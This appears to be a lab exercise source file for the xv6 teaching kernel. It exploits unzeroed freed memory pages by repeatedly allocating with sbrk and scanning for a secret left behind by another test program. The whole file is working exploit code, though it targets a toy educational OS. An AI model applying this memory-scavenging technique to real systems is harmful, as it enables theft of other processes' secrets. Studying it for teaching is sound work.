/*
Exploiting the vulnerabilities in the memory management system
the allocation and deallocation of memory page does not erase previous
memory allocated in the memory. Tries to retrieve secret generated
from secret.c called by attacktest.c
*/
#include "kernel/types.h"
#include "kernel/fcntl.h"
#include "user/user.h"
#include "kernel/riscv.h"

int
main(int argc, char *argv[])
{
    char secret[8];
    while (1) {
        char *end = sbrk(PGSIZE);
        end = end + 32;
        int i = 0;
        for (; i < 8; i++) {
            char c = *(end+i);
            if (c != '.' && c!= 'a' && c!= 'b' && c!= 'c' && c!= 'd'&& c!= 'e' && c!= 'f' && c!= '/') {
                break;
            }
        }
        if (i == 7) {
            strcpy(secret, end);
            break;
        }        
    }
    // write(2, "OK: secret is ", strlen("OK: secret is "));
    write(2, secret, 8);
    exit(1);
}
